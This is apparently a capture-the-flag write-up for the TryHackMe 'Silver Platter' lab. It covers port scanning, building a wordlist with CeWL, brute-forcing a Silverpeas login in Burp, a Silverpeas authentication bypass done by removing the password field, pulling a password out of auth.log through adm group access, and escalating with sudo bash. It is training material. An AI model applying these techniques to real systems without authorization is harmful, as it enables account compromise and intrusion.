---
layout: post
title: "TryHackMe:Silver Platter"
date: 2025-01-13 03:00:00 +0000
categories: [Tryhackme, Silver Platter]
tags: [Tryhackme]
---

Silver Peas is a easy level room by [TeneBrae93](https://tryhackme.com/r/p/TeneBrae93).It’s well-designed, teaches useful skills like privilege escalation and exploitation, and feels realistic. It might be tricky at times, but it’s super rewarding once you crack it. Definitely worth a try!

## <b>Initial Enumeration:</b>

<b>Let's start with nmap</b>
```console
nmap 10.10.121.208 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-13 08:43 EST
Nmap scan report for 10.10.121.208
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
```
Found Three ports open:


```22```      ssh

```80```      http

```8080```    http

### HTTP ```80```

![web](assets/images/img1.jpg)

### HTTP ```8080```

![web](assets/images/img2.png)

<b>Found a Login Page on http://10.10.121.208:8080/silverpeas/</b>

![login page](assets/images/img3.png)

As stated in the room description, [``` their password policy requires passwords that have not been breached (they check it against the rockyou.txt wordlist - that's how 'cool' they are). ```] 

we are not recommended to use the rockyou.txt wordlist because their password policy checks against it to ensure that passwords haven't been compromised.

So, we will make our own Wordlist

i did some research and came across this tool named 'CeWl'

```CeWL (Custom Wordlist Generator) is a tool for generating wordlists by scraping websites. It's commonly used for cybersecurity and penetration testing to create targeted wordlists.```

```console
┌──(root㉿kali)-[/home/kali]
└─# cewl http://10.10.121.208/ > password.txt
```

Found the password for the username "scr1ptkiddy" using password.txt in Burp Suite's Intruder.

![burpsuite](assets/images/img4.jpg)

We can now login with the username and password we Found

<B>OR</B>

We can use info from the CVE Found for silverpeas

[CVE:Silverpeas authentication bypass](https://github.com/advisories/GHSA-4w54-wwc9-x62c)

According to which we can login into silverpeas web page by removing password field

![cve](assets/images/img6.jpg)

we'll try the following 

![](assets/images/img8.jpg)

ANDD!! We got the login

I found SSH password for user:Tim and pass on notification tab beside user profile 

![ssh](assets/images/img10.jpg)

## Gaining Foothold

![user.txt](/assets/images/img13.jpg)

## Privilage Escalation

First we will Try classic ```sudo -l``` approch
 
```console
tim@silver-platter:/$ sudo -l
[sudo] password for tim: 
Sorry, user tim may not run sudo on silver-platter.
```
We can't do anything as Tim

But I got intersting group in Our machine
```console
tim@silver-platter:/$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)

```

Traditionally the adm group is used to give a user access to some sort of system log files.
e.g. ls -l /var/log.

I Checked the log files and found the ssh password for user:tyler

```console
tim@silver-platter:/var/log$ cat auth.log auth.log.1 auth.log.2 | grep 'PASSWORD'
Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Z********3/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
```

## Sudo as Root

![sudo as tyler](/assets/images/sudoastyler.jpg)

```console
tyler@silver-platter:/$ cd /root
bash: cd: /root: Permission denied

```

We'll try sudo -l

```console
tyler@silver-platter:/home/tim$ sudo -l
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
```
We can run all commands as tyler
so We'll just Sudo bash a login into root and get  root.txt
```console
tyler@silver-platter:/$ sudo bash
root@silver-platter:/# cat /root/root.txt
THM{0**************************6}
```

Happy hacking !!